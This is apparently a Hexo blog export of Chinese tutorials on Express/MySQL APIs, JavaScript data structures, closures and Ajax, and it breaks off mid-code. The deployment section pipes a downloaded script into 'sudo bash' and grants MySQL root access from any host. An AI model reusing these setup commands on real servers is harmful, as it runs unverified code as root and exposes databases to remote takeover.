{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"John Doe","url":"http://yoursite.com"},"pages":[],"posts":[{"title":"使用express+MySQL实现数据接口并部署","slug":"使用express-MySQL实现数据接口并部署","date":"2019-07-08T14:20:58.000Z","updated":"2019-07-09T09:43:02.296Z","comments":true,"path":"2019/07/08/使用express-MySQL实现数据接口并部署/","link":"","permalink":"http://yoursite.com/2019/07/08/使用express-MySQL实现数据接口并部署/","excerpt":"","text":"创建123npm initnpm install express --savenpm install ejs 创建main.js（init的时候选的文件名）和api、config、routers、src、views文件夹 项目结构 12345678910111213|── main.js //入口文件|── src //静态资源目录│ ├── css│ ├── js│ └── images|── api //接口目录│ └── addUser.js //接口文件|—— config //配置文件目录| └── config.json|—— routers //路由文件目录| └── index.js|—— views //模板文件目录| └── index.ejs 实现main.js 1234567891011121314151617181920212223242526272829const express = require('express');const app = express();/*文件路径处理*/const path = require('path');/*页面模板view处理*/app.set('views', path.join(__dirname, 'views'));app.set('view engine', 'ejs');/*页面静态文件处理*/app.use(express.static('src'));/*页面路由处理*/const index = require('./routers/index');app.use('/', index);/*接口路由处理*/const addUser = require('./api/addUser');app.use('/addUser', addUser);/*接口数据body解析处理*/const bodyParser = require('body-parser');app.use(bodyParser.json());app.use(bodyParser.urlencoded(&#123; extended : false &#125;));const server = app.listen(9000, function () &#123; console.log('success!');&#125;) routers&gt;index.js 123456789const express = require('express');const router = express.Router();/*设置首页路由get请求*/router.get('/', function(req, res, next)&#123; res.render('index', &#123;title: 'Try express'&#125;);&#125;)module.exports = router; views&gt;index.ejs 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel='stylesheet' type=\"text/css\" href=\"/css/style.css\"&gt; &lt;script src=\"/js/jquery-3.1.1.min.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;input id='name' name='name' type=\"text\"/ placeholder=\"输入用户名\"&gt; &lt;input id='btn' type=\"button\" value=\"提交\"/&gt; &lt;script&gt; $('#btn').on('click', function()&#123; let name = $('#name').val(); console.log(name); $.post('/addUser', &#123;name: name&#125;, function(data)&#123; console.log(data); alert('添加成功！'); &#125;); &#125;) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; config&gt;config.json配置mysql信息 1234567&#123; \"host\": \"ip\", \"port\": \"端口号\", \"user\": \"用户名\", \"password\": \"密码\", \"database\": \"数据库名称\"&#125; api&gt;addUser.js 123456789101112131415161718192021222324252627282930313233const express = require('express');const router = express.Router();const mysql = require('mysql');const config = require('../config/config.json');router.post('/', function(req, res)&#123; /*连接数据库*/ const connection = mysql.createConnection(config); connection.connect(); /*获取传进来的参数*/ var name = req.body.name || ''; /*构建添加用户语句，ID属性为auto_increment*/ var sql = \"insert into user values(\" + \"null,\" + connection.escape(name) + \")\"; //console.log(sql); /*向数据库添加数据*/ connection.query(sql, function(err, rows, fields)&#123; /*返回response*/ res.send(&#123; status: 200, data: rows, err: err, message: \"success\" &#125;) &#125;); connection.end();&#125;)module.exports = router; 数据库连接问题本地连接问题报错client does not support authentication 的解决办法： 12mysql&gt; alter user &apos;用户名&apos;@&apos;localhost&apos; identified with mysql_native_password by &apos;密码&apos;;mysql&gt; flush privileges; 远程连接问题连接服务器数据库，被拒绝服务。 解决办法：Ubuntu设置MySQL允许远程访问，参考：链接 1&gt; sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf 将bind-address = 127.0.0.1注释掉； 给root授予在任意主机（%）访问任意数据库的所有权限 1mysql&gt; grant all privileges on *.* to &apos;root&apos;@&apos;%&apos; identified by &apos;密码&apos; with grant option; 或者把root用户修改成允许远程主机访问 12mysql&gt; update user set host=&apos;%&apos; where user=&apos;root&apos; and host=&apos;localhost&apos;;mysql&gt; flush privileges; 完成后退出并重启mysql 1&gt;sudo service mysql restart 在Ubuntu服务器上配置node环境安装nodejs第一种办法： 123456789sudo apt updatesudo apt install node.jssudo apt install npmsudo apt install nodejs-legacynpm config set registry http://registry.npm.taobao.org/sudo npm install n -gsudo n stable 第二种办法：（安装指定版本） 如安装Node.js v12.x： 123# Using Ubuntucurl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -sudo apt-get install -y nodejs 安装Express并运行12345678sudo npm install express-generator -g#创建web应用程序express express-appcd express-appnpm install#测试并启动DEBUG=myapp:* npm start 可以在服务器的3000端口访问到这个express应用 安装pm212345sudo npm install pm2 -gcd ~/express-app/#使用pm2进程管理器运行express应用pm2 start ./bin/www 如图所示，express应用正在pm2中运行，名称为www，id为0 显示更多信息 1pm2 show www 查看日志 1pm2 logs www 设置开机自启 12pm2 startup systemdsudo env PATH=$PATH:/usr/local/bin /usr/local/lib/node_modules/pm2/bin/pm2 startup systemd -u ubuntu --hp /home/ubuntu 参考：这里是链接","categories":[],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"http://yoursite.com/tags/Node-js/"},{"name":"Express","slug":"Express","permalink":"http://yoursite.com/tags/Express/"},{"name":"MySQL","slug":"MySQL","permalink":"http://yoursite.com/tags/MySQL/"}]},{"title":"JavaScript数据结构与算法学习","slug":"JavaScript数据结构与算法学习","date":"2019-07-05T09:34:30.000Z","updated":"2019-07-14T15:25:16.855Z","comments":true,"path":"2019/07/05/JavaScript数据结构与算法学习/","link":"","permalink":"http://yoursite.com/2019/07/05/JavaScript数据结构与算法学习/","excerpt":"","text":"数组添加、插入元素1234567891011121314var numbers = [0,1,2,3,4,5];//向数组尾部添加number.push(6);number.push(7,8,9); //[0,1,2,3,4,5,6,7,8,9]//插入元素到首位for (var i = numbers.length; i &gt;= 0; i--) &#123; numbers[i] = numbers[i-1];&#125;numbers[0] = -1;//或者用unshift()方法numbers.unshift(-2);numbers.unshift(-5,-4,-3); //[-5,-4,-3,-2,-1,0,1,2,3,4,5,6,7,8,9]//在任意位置添加元素(比如在位置5插入1,2,3)splice(5,0,1,2,3) //因为在这里不删元素，所以第二个参数为零 删除元素12345678910//删除末尾元素numbers.pop();//删除首位元素for (var i = 0; i &lt; numbers.length; i++) &#123; numbers[i] = numbers[i+1];&#125;//或者用shift()方法numbers.shift();//在任意位置删除元素(比如在位置5删除3个元素，即删掉了位置5、6、7上的元素)numbers.splice(5,3); 合并数组1234var zero = 0;var positiveNumbers = [1,2,3];var negativeNumbers = [-1,-2,-3];var numbers = negativeNumbers.concat(zero, positiveNumbers); 数组的迭代器函数12345678910111213141516171819//遍历numbers.forEach(x =&gt; &#123; console.log(x);&#125;);for (let n of numbers) &#123; console.log(n);&#125;//一个判断是否为偶数的函数var isEven = (x) =&gt; &#123; return (x % 2 == 0) ? true : false;&#125;numbers.every(isEven); //false；全部为偶才返回truenumbers.some(isEven); //true；只要存在偶数就返回truenumbers.map(isEven); // [false, true, false, true, false, true, false, true, false, true]；返回结果数组numbers.filter(isEven); //[2, 4, 6, 8, 10]；返回所有符合条件的元素所组成的数组//reduce()会将每次的结果叠加到累加器，执行结束返回累加器的值numbers.reduce(function(prev, curr, index) &#123; //数组求和 return prev + curr;&#125;); 数组排序123456789101112//逆序numbers.reverse();//升序numbers.sort((a,b) =&gt; &#123; if (a &lt; b) &#123; return -1; &#125; if (a &gt; b) &#123; return 1; &#125; return 0;&#125;); 栈 (后进先出LIFO)123456789101112function Stack () &#123; let items = []; //保存栈中的元素 //向栈添加元素 this.push = function(element) &#123; items.push(element); &#125; //从栈移除元素 this.pop = function() &#123; return items.pop(); &#125;&#125; 用ES6的class创建： 123456789class Stack &#123; constructor () &#123; this.items = []; &#125; push(element) &#123; this.items.push(element); &#125; //其他方法与上述写法类似&#125; 例子：用栈实现十进制转二进制的函数 1234567891011121314151617function divideBy2(dec) &#123; var remStack = new Stack(), rem, binaryString = ''; while (dec &gt; 0) &#123; rem = Math.floor(dec % 2); remStack.push(rem); dec = Math.floor(dec / 2); &#125; while (!remStack.isEmpty()) &#123; binaryString += remStack.pop().toString(); &#125; return binaryString;&#125; 队列 (先进先出FIFO)1234567891011121314151617181920212223242526272829function Queue () &#123; let items = []; //向队列添加元素 this.enqueue = function(element) &#123; items.push(element); &#125; //从队列移除元素 this.dequeue = function() &#123; return items.shift(); &#125; //查看队头元素 this.front = function() &#123; return items[0]; &#125; //检查队列是否为空 this.isEmpty = function() &#123; return items.length == 0; &#125; //打印队列元素个数 this.size = function() &#123; return items.length; &#125; //打印队列元素 this.print = function() &#123; console.log(items.toString()); &#125;&#125;let queue = new Queue();queue.enqueue('Nancy'); 优先队列（对应的优先级数字越小优先级越高） 1234567891011121314151617181920212223242526272829function PriorityQueue() &#123; let items = []; function QueueElement (element, priority) &#123; this.element = element; this.priority = priority; &#125; this.enqueue = function(element, priority) &#123; let queueElement = new QueueElement(element, priority); let added = false; for (let i = 0; i &lt; items.length; i++) &#123; if (queueElement.priority &lt; items[i].priority) &#123; items.splice(i,0,queueElement); added = true; break; &#125; &#125; if (!added) &#123; items.push(queueElement); &#125; &#125;; this.print = function() &#123; for (let i = 0; i &lt; items.length; i++) &#123; console.log(`$&#123;items[i].element&#125;,$&#123;items[i].priority&#125;`); &#125; &#125;; //其他方法与普通队列一致&#125; 链表普通链表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124function LinkedList() &#123; //创建Node类表示链表项 let Node = function(element) &#123; this.element = element; this.next = null; &#125; let length = 0; let head = null; //向链表末尾追加节点 this.append = function(element) &#123; let node = new Node(element), current; if(head == null) &#123; head = node; &#125; else &#123; current = head; while(current.next) &#123; current = current.next; &#125; current.next = node; &#125; length++; &#125;; //删除指定位置的节点 this.removeAt = function(position) &#123; if(position &gt; -1 &amp;&amp; position &lt; length) &#123; let current = head, previous, index = 0; if(position === 0) &#123; head = current.next; &#125; else &#123; while(index++ &lt; position) &#123; previous = current; current = current.next; &#125; previous.next = current.next; &#125; length--; return current.element; &#125; else &#123; return null; &#125; &#125; //在任意位置插入节点 this.insert = function(position, element) &#123; if(position &gt;= 0 &amp;&amp; position &lt;= length) &#123; let node = new Node(element), current = head, previous, index = 0; if(position === 0)&#123; node.next = current; head = node; &#125; else &#123; while(index++ &lt; position) &#123; previous = current; current = current.next; &#125; node.next = current; previous.next = node; &#125; length++; return true; &#125; else &#123; return false; &#125; &#125;; //把LinkedList对象转换成字符串 this.toString = function() &#123; let current = head, string = ''; while(current)&#123; string += current.element + (current.next ? '\\n' : ''); current = current.next; &#125; return string; &#125;; //返回节点对应的索引值 this.indexOf = function(element) &#123; let current = head; index = 0; while(current) &#123; if(current.element === element) &#123; return index; &#125; index++; current = current.next; &#125; return -1; &#125;; //判空 this.isEmpty = function() &#123; return length === 0; &#125;; //获取链表长度 this.size = function() &#123; return length; &#125;; //获取头节点 this.getHead = function() &#123; return head; &#125;&#125; 双向链表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081function DoublyLinkedList() &#123; let Node = function(element) &#123; this.element = element; this.prev = null; this.next = null; &#125; let length = 0; let head = null; let tail = null; this.insert = function(position, element) &#123; if(position &gt;= 0 &amp;&amp; position &lt;= length) &#123; let node = new Node(element), current = head, previous, index = 0; if(position === 0) &#123; if(!head) &#123; head = node; tail = node; &#125; else &#123; node.next = current; current.prev = node; head = node; &#125; &#125; else if (position === length) &#123; current = tail; current.next = node; node.prev = current; tail = node; &#125; else &#123; while(index++ &lt; position)&#123; previous = current; current = current.next; &#125; node.next = current; node.prev = previous; &#125; length++; return true; &#125; else &#123; return false; &#125; &#125;; this.removeAt = function(position) &#123; if(position &gt; -1 &amp;&amp; position &lt; length)&#123; let current = head, previous, index = 0; if(position === 0) &#123; head = current.next; if(length === 1) &#123; tail = null; &#125; else &#123; head.prev = null; &#125; &#125; else if (position === length-1) &#123; current = tail; tail = current.prev; tail.next = null; &#125; else &#123; while(index++ &lt; position) &#123; previous = current; current = current.next; &#125; previous.next = current.next; current.next.prev = previous; &#125; length--; return current.element; &#125; else &#123; return null; &#125; &#125;;&#125; 循环链表与普通链表的区别在于tail.next不是null而是head。 集合集合由一组无序且唯一的项组成。 创建集合 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120function Set() &#123; let items = &#123;&#125;; this.has = function(value) &#123; return items.hasOwnProperty(value); &#125;; this.add = function(value) &#123; if(!this.has(value))&#123; items[value] = value; return true; &#125; return false; &#125;; this.remove = function(value) &#123; if(this.has(value))&#123; delete items[value]; return true; &#125; return false; &#125;; this.clear = function() &#123; items = &#123;&#125;; &#125;; this.size = function() &#123; return Object.keys(items).length; &#125;; //size()方法的兼容版本 this.sizeLegacy = function() &#123; let count = 0; for(let key in items) &#123; if(items.haOwnProperty(key)) ++count; &#125; return count; &#125; this.values = function() &#123; let values = []; for(let i = 0, keys = Object.keys(items); i&lt;keys.length; i++) &#123; values.push(items[keys[i]]) &#125; return values; &#125; //values()的兼容版本 this.valuesLegacy = function() &#123; let values = []; for(let key in items) &#123; if(items.hasOwnProperty(key)) &#123; values.push(items[key]); &#125; &#125; return values; &#125;; //取并集 this.union = function(otherSet) &#123; let unionSet = new Set(); let values = this.values(); for(let i=0; i&lt;values.length; i++) &#123; unionSet.add(values[i]); &#125; values = otherSet.values(); for(let i=0; i&lt;values.length; i++) &#123; unionSet.add(values[i]); &#125; return unionSet; &#125;; //取交集 this.intersection = function(otherSet) &#123; let intersectionSet = new Set(); let values = this.values(); for(let i=0; i&lt;values.length; i++) &#123; if(otherSet.has(values[i])) &#123; intersectionSet.add(values[i]); &#125; &#125; return intersectionSet; &#125;; //差集 this.difference = function(otherSet) &#123; let differenceSet = new Set(); let values = this.values(); for (let i=0; i&lt;values.length; i++) &#123; if(!otherSet.has(values[i])) &#123; differenceSet.add(values[i]); &#125; &#125; return differenceSet; &#125;; //判断是否是另一个集合的子集 this.subset = function(otherSet) &#123; if(this.size() &gt; otherSet.size()) &#123; return false; &#125; else &#123; let values = this.values(); for (let i=0; i&lt;values.length; i++) &#123; if(!otherSet.has(values[i]))&#123; return false; &#125; &#125; return true; &#125; &#125;; &#125; ES6——Set类 区别：values()方法返回一个Iterator；自身具有size属性；无自带的并集、交集、差集和子集方法，但可以用其他自身方法实现。 并集 123let unionAB = new Set();for (let x of setA) unionAB.add(x);for (let x of setB) unionAB.add(x); 交集 12345678910let intersection = function(setA, setB) &#123; let intersectionSet = new Set(); for (let x of setA) &#123; if(setB.has(x)) &#123; intersectionSet.add(x); &#125; &#125; return intersectionSet;&#125;;let intersectionAB = intersection(setA, setB); 差集 12345678910111213let difference = function(setA, setB) &#123; let differenceSet = new Set(); for (let x of setA) &#123; if (!setB.has(x)) &#123; differenceSet.add(x); &#125; &#125; return differenceSet;&#125;;let differenceAB = difference(setA, setB);//或者用ES6的写法实现differenceAB = new Set([x for (x of setA) if (!setB.has(x))]); 字典和散列表树图","categories":[],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://yoursite.com/tags/Javascript/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://yoursite.com/tags/数据结构与算法/"}]},{"title":"JS之闭包和原型那些事儿","slug":"JS之闭包和原型那些事儿","date":"2019-04-02T14:17:33.000Z","updated":"2019-04-07T03:24:02.953Z","comments":true,"path":"2019/04/02/JS之闭包和原型那些事儿/","link":"","permalink":"http://yoursite.com/2019/04/02/JS之闭包和原型那些事儿/","excerpt":"","text":"Part1：作用域和闭包作用域是什么？我们需要一套设计良好的规则用于存储变量，并且之后可以方便地找到这些变量，这套规则被称为作用域。 JS的编译原理在传统编译语言的流程中，程序的源代码在被执行前会经历三个步骤，统称为“编译”。 分词/词法分析 在这个过程中由字符组成的字符串被分解成有意义的代码块，这些代码块即词法单元。比如var a = 2;会分解成var、a、=、2、；。 解析/语法分析 在这个过程中词法单元流（数组）转换成一个由元素逐级嵌套组成的代表程序语法结构的树，即“抽象语法树（AST）”。 代码生成 将抽象语法树转换成可执行代码。比如将var a = 2;的AST转化为一组机器指令，用来创建a变量（分配内存等），并将2存储在a中。 不过JS引擎相对这种传统的编译器要复杂得多，比如JS引擎在语法分析和代码生成时会对运行性能进行优化，包括对冗余元素的优化等。 对于JS来说，编译大多发生在代码执行前的几微秒甚至更短的时间内。 编译器遇到var a时会询问该作用域中是否已经有同名的变量，如果是编译器会忽略该声明，否则会声明一个新的变量a。接下来编译器会为引擎生成运行时所需的代码用于处理a=2这个赋值操作。引擎运行时会首先询问在当前作用域集合中是否存在一个叫作a的变量，如果存在引擎会把2赋给a，否则引擎继续查找该变量，若仍未找到则抛出异常。 JS引擎的LHS和RHS查询LHS查询是查找变量的容器本身，从而对变量赋值；RHS查询即查找某个变量的值，或者说是取到它的源值。 “寻找赋值操作的目标”=&gt;LHS查询；“获取变量的值”=&gt;RHS查询 在当前作用域中无法找到某个变量时引擎就会在外层嵌套的作用域中继续查找，直到找到该变量或抵达最外层的作用域（全局作用域）为止。 如果RHS查询在所有的嵌套作用域中都找不到所需变量引擎会抛出ReferenceError异常；而引擎在执行LHS查询时如果没有找到目标变量就会在全局作用域中创建一个具有该名称的变量，并将其返还给引擎（在非严格模式下），严格模式下也会报错。 词法作用域词法作用域由变量和块作用域在代码中的位置决定。 有两种欺骗词法的机制：分别是eval()和with关键字的使用。欺骗词法作用域会导致性能下降，所以在代码中尽量不使用。 在执行eval(..)之后的代码时，引擎并不知道eval()内的代码是以动态的形式插入进来并对词法作用域进行修改的。 注意setTimeout(..)和setInterval(..)的第一个参数可以是字符串，字符串的内容会被解释成一段动态生成的函数代码。new Function(..)最后一个参数也可以接受代码字符串，也是类似的，不提倡使用。 with声明实际上是根据传递给它的对象凭空创建了一个全新的词法作用域，并且还会产生意想不到的影响，比如下面的例子。 123456789function foo(obj)&#123; with(obj)&#123; a = 2; &#125;&#125;var obj = &#123; b:3 &#125;foo(obj); //注意obj中没有a变量console.log(obj.a); //undefinedconsole.log(a); //2——a变量被泄露到全局作用域上了 函数作用域把代码片段用函数声明进行封装实际上就是用作用域把这些代码隐藏了，将具体内容私有化，同时可以规避命名冲突。 12function foo()&#123;...&#125; //声明了一个具名函数，但foo这个函数名也会“污染”所在作用域foo(); 解决办法： 1(function foo()&#123;...&#125;)(); //立即执行函数表达式IIFE 1234var a = 2;(function IIFE(obj)&#123; console.log(obj.a);&#125;)(window); //可以传入参数，函数也能传 12345678910//用匿名函数setTimeout(function()&#123; alert('..');&#125;,1000);//匿名函数在栈追踪中不会显示出有意义的函数名，使得调试很困难//若没有函数名，当函数需要调用自身时只能通过过期的arguments.callee引用//可以让匿名函数具名setTimeout(function handler()&#123; alert('..');&#125;,1000); 块级作用域如for循环，with关键字，try/catch…还有各种{…} let关键字可以将变量隐式地附加在一个已经存在的块级作用域上。比如let在for循环中会将变量i重新绑定到循环的每个迭代中。 1234567891011for(let i=0;i&lt;len;i++)&#123; console.log(i);&#125;//等同于&#123; let j; for(j=0;j&lt;len;j++)&#123; let i = j; //每个迭代重新绑定 console.log(i); &#125;&#125; 块级作用域有助于垃圾回收，为变量显式声明作用域并进行本地绑定十分有用。 123456789function process(data)&#123; //...&#125;var bigData = &#123;/*..*/&#125;;process(bigData);btn.addEventListener('click',function click(evt)&#123; //click函数会形成一个覆盖整个作用域的闭包，可能导致bigData不被回收 console.log('clicked');&#125;) 通过添加块级作用域解决 12345678910function process(data)&#123; //...&#125;&#123; let bigData = &#123;/*..*/&#125;; process(bigData);&#125;btn.addEventListener('click',function click(evt)&#123; console.log('clicked');&#125;) 作用域提升无论作用域中的声明出现在什么地方都会在代码本身被执行前首先进行处理，所有的声明（变量和函数）都会被“移动”到各自作用域的顶端。 函数声明和变量声明都会被提升，但是函数声明会优先被提升。 12345678foo(); //1var foo;function foo()&#123; //函数声明会被优先提升 console.log(1);&#125;foo = function()&#123; console.log(2);&#125; 12345678//上面的代码实际是这样function foo()&#123; console.log(1);&#125;foo();foo = function()&#123; console.log(2);&#125; 12345678910foo(); //3function foo()&#123; console.log(1);&#125;var foo = function()&#123; console.log(2);&#125;function foo()&#123; //在后面出现的同名函数声明可以覆盖前面的 console.log(3);&#125; 作用域闭包举个例子解释一下 123456789function foo()&#123; var a = 2; function bar()&#123; console.log(a); &#125; return bar;&#125;var baz = foo();baz(); //2——这就是闭包的效果 bar()可以访问foo()的内部作用域，并将bar()作为返回值。然后将返回值赋给了baz，使得bar()函数在自身的词法作用域之外通过调用baz()被执行；foo()执行后其内部作用域不会被回收，因为bar()仍然在使用foo()的作用域。bar()拥有涵盖foo()内部作用域的闭包，使得该作用域能够一直存活，以供bar()在以后任何时间引用 ，bar()持有的对foo()内部作用域的引用就是闭包。 1234567891011function foo()&#123; var a = 2; function baz()&#123; console.log(a); &#125; bar(baz);&#125;function bar(fn)&#123; fn(); //这里会调用传入的内部函数baz，闭包被使用&#125;foo(); 无论通过何种方式将内部函数传递到所在的词法作用域之外，都会使得它持有对原始作用域的引用，所以无论在何处执行这个函数都会使用闭包。 回调函数实际上也在使用闭包。 循环和闭包12345for(var i=1;i&lt;=5;i++)&#123; setTimeout(function timer()&#123; console.log(i); &#125;,i*1000);&#125; 上面这段代码我们预期会依次输出数字1~5，但实际上会已每秒一次的频率输出五次6。说明输出的是循环结束时的i值，这是因为延迟函数的回调会在循环结束时执行。我们试图假设每次迭代运行时都会给自己捕获一个i的副本，但它们还是被封闭在一个共享的全局作用域中，实际只有一个i。 我们需要在每次迭代中生成一个独有的闭包作用域。 123456789//解决办法一for(var i=1;i&lt;=5;i++)&#123; (function()&#123; var j = i; setTimeout(function timer()&#123; console.log(j); &#125;, j*1000); &#125;)(i);&#125; 1234567//解决办法二for(let i=1;i&lt;=5;i++)&#123; //每次迭代变量i都会被重新声明 //第一次迭代之后的每次迭代都会使用上一个迭代结束的值来初始化变量i setTimeout(function timer()&#123; console.log(i); &#125;,i*1000);&#125; 模块（重点）12345678910111213141516//这是一个模块function module()&#123; var sth1 = 'value'; var sth2 = [1,2,3]; function doSomething()&#123; console.log(sth1); &#125; function doAnother()&#123; console.log(sth2.join(',')); &#125; return &#123; //返回值可以看作模块的公共API doSomething: doSomething, doAnother: doAnother &#125;;&#125;var foo = module(); 模块模式需要具备两个必要条件： 必须有外部的封闭函数，该函数至少被调用一次（每次调用都会创建一个新的模块实例）。 封闭函数必须返回至少一个内部函数，这样内部函数才能在私有作用域中形成闭包，并可以访问或修改私有属性。 现代模块机制： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546var MyModules = (function Manager()&#123; var modules = &#123;&#125;; //模块的内容 function define(name,deps,impl)&#123; //name是我们定义的新模块的名字 //deps是新模块所依赖的模块名字的数组 //impl是个function for(var i=0;i&lt;deps.length;i++)&#123; //将传入的deps数组的每个元素转变为模块的一个引用 deps[i] = modules[deps[i]]; &#125; //通过apply调用impl，将依赖模块的引用作为参数传入新模块的作用域中 modules[name] = impl.apply(impl,deps); &#125; function get(name)&#123; return modules[name]; &#125; return &#123; define: define, get: get &#125;;&#125;)();MyModules.define('bar',[],function()&#123; function hello(who)&#123; return 'hello,' + who; &#125; return &#123; hello: hello &#125;;&#125;);MyModules.define('foo',['bar'],function(bar)&#123; var val = 'happy'; function awesome()&#123; console.log(bar.hello(val).toUpperCase()); &#125; return &#123; awesome: awesome &#125;;&#125;);var bar = MyModules.get('bar');var foo = MyModules.get('foo');console.log( bar.hello('happy'); //hello,happy);foo.awesome(); //HELLO,HAPPY 插播apply()和call()的用法：链接 ES6模块API： 1234567891011121314151617181920212223//bar.jsfunction hello(who)&#123; return 'hello,' + who;&#125;export hello;//foo.jsimport hello from 'bar';var val = 'happy';function awesome()&#123; console.log( hello(val).toUpperCase() );&#125;export awesome;//baz.jsmodule foo from 'foo';module bar from 'bar';console.log( bar.hello('happy'); //hello,happy);foo.awesome(); //HELLO,HAPPY import可以将一个模块中的一个或多个API导入到当前作用域当中，并分别绑定到变量上；module会将整个模块的API导入并绑定到一个变量上。 模块文件中的内容会被当作包含在作用域闭包中一样来处理，就像函数闭包模块一样。","categories":[],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://yoursite.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://yoursite.com/tags/前端/"}]},{"title":"Ajax学习笔记","slug":"Ajax学习笔记","date":"2019-02-05T14:16:28.000Z","updated":"2019-02-05T14:17:34.701Z","comments":true,"path":"2019/02/05/Ajax学习笔记/","link":"","permalink":"http://yoursite.com/2019/02/05/Ajax学习笔记/","excerpt":"","text":"认识AjaxAjax：Asynchronous Javascript and XML （即异步的javascript和XML），是一种在无需重新加载整个页面的情况下能够更新部分页面的技术。通过在后台跟服务器进行少量的数据交换，网页就可以实现异步局部更新。 运用HTML和CSS实现页面，然后构建XMLHttpRequest对象进行页面与web服务器间的异步数据交换，页面获取到响应信息后运用Javascript操作DOM，实现局部动态更新。 Ajax-XMLHttpRequest对象构建123456var request;if(window.XMLHttpRequest)&#123; request = new XMLHttpRequest(); //IE7+,Firefox,Chrome,Opera,Safari...&#125;else&#123; request = new ActiveXObject(\"Microsoft.XMLHTTP\"); //IE5,IE6&#125; Ajax-HTTP请求HTTP是计算机通过网络进行通信的规则，是一种无状态的协议。 完整的HTTP请求步骤： 建立TCP连接 Web浏览器向Web服务器发送请求命令 浏览器发送请求头信息 服务器应答 服务器发送应答头信息 服务器向浏览器发送数据 服务器关闭TCP连接 GET：一般用于信息获取，使用URL传递参数，发送信息的数量限制在2000个字符内 POST：一般用于修改服务器上的资源，对所发送信息数无限制 HTTP状态码： 1XX：表示接收到浏览器请求，正在处理信息 2XX：成功，用户请求被正确接收、理解和处理 （200 OK） 3XX：重定向，表示请求没有成功，用户必须采取进一步操作 4XX：客户端错误，表示客户端提交的请求有误 5XX：服务器错误，表示服务器不能完成对请求的处理 XHR发送请求 open(method,url,async) send(string) 1234567request.open(\"GET\",\"get.php\",true);request.send();request.open(\"POST\",\"create.php\",true);//设置头信息request.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");request.send(\"name=nancy&amp;age=3\"); XHR取得响应 responseText：获得字符串形式的响应数据 responseXML：获得XML形式的响应数据 status和statusText：以数字和文本形式返回HTTP状态码 getAllResponseHeader()：获取所有的响应报头 getResponseHeader()：查询响应中的某个字段的值 readyState属性 0：请求未初始化，open还未调用 1：服务器连接已建立，open已经调用了 2：请求已接收 3：请求处理中 4：请求已完成，响应已就绪 12345678910111213141516request.onreadystatechange = function()&#123; if(request.readyState === 4)&#123; //判断响应结果 if(request.status === 200)&#123; //成功，通过responseText得到响应文本 return success(request.responseText); &#125;else&#123; //失败，根据响应码判断失败原因 return fail(request.status); &#125; &#125;else&#123; //HTTP请求还在继续... &#125;&#125;request.open('GET','/api/categories');request.send(); JSONJSON：Javascript对象表示法。JSON是存储和交换文本信息的语法，类似XML。它采用键值对的方式组织起来，易于阅读和编写，同时易于机器解析和生成。JSON是独立于语言的，只要符合JSON的规则，无论什么语言都可以解析JSON。 JSON的长度与XML格式相比很短小，读写速度快。JSON可以使用javascrip内建的方法直接进行解析转换成JavaScript对象，十分便捷。 JSON语法规则JSON数据的书写格式：名称/值对 （比如：”name”:”nancy”） JSON的值可以是数字、字符串、逻辑值、数组（在方括号中）、对象（在花括号中）和null。 123456&#123; \"staff\":[ &#123;\"name\":\"nancy\",\"age\":3&#125;, &#123;\"name\":\"pig\",\"age\":2&#125; ]&#125; JSON解析方式12345var jsondata = '&#123;\"staff\":[&#123;\"name\":\"nancy\",\"age\":3&#125;,&#123;\"name\":\"pig\",\"age\":2&#125;]&#125;';//第一种方式用eval不会看JSON数据形式是否合法，直接执行，是不安全的var jsonObj = eval('('+jsondata+')'); //第二种方式用parse函数相对安全var jsonObj2 = JSON.parse(jsondata); 123456789request.onreadystatechange = function()&#123; if(request.readyState === 4)&#123; if(request.status === 200)&#123; var data = JSON.parse(request.responseText); if(data.success)&#123;...&#125; else &#123;...&#125; &#125;else &#123; alert(\"发生错误：\"+request.status); &#125; &#125;&#125; 用JQuery实现Ajax jQuery.ajax([settings]) type：类型，”POST“或”GET“，默认为”GET“ url：发送请求的地址 data：是一个对象，连同请求发送到服务器的数据 dataType：预期服务器返回的数据类型。如果不确定，jQuery将自动根据HTTP包MIME信息智能判断，一般采用JSON格式，可设置为”JSON“ success：是一个方法，请求成功后的回调函数。传入返回后的数据，以及包含成功代码的字符串 error：是一个方法，请求失败时调用此函数。传入XMLHttpRequest对象 例如： 1234567891011121314$(document).ready(function()&#123; $(\"#search\").click(function()&#123; $.ajax(&#123; type: \"GET\", url: \"service.php?number=\"+$(\"#keyword\").val(), dataType: \"json\", success: function(data)&#123; if(data.success)&#123; &#125;else&#123;...&#125; &#125;, error: function(jqXHR)&#123;...&#125; &#125;); &#125;);&#125;); 处理跨域方式当协议、子域名、主域名、端口号中任意一个不同时都算作不同域，不同域之间相互请求资源就算作“跨域”。Javascript出于安全方面的考虑，不允许跨域调用其他页面的对象，即Javascript同源策略的限制。 方法一：创建代理在同域名的服务器上创建代理。比如现在有两个服务器域名分别为www.beijing.com和www.shanghai.com，在北京的服务器后端（www.beijing.com/proxy-shanghaiservice.php）调用上海服务器（www.shanghai.com/service.php）的服务，然后把响应结果返回给前端。 方法二：JSONPJSONP可用于解决主流浏览器的跨域数据访问问题（不支持POST请求）。 123456789//www.aaa.com某网页&lt;script&gt; function jsonp(json)&#123; alert(json['name']); &#125;&lt;/script&gt;&lt;script src=\"http://www.bbb.com/jsonp.js\"&gt;&lt;/script&gt;//www.bbb.com页面中jsonp(&#123;'name':'nancy','age':3&#125;); 123456789101112131415$(document).ready(function()&#123; 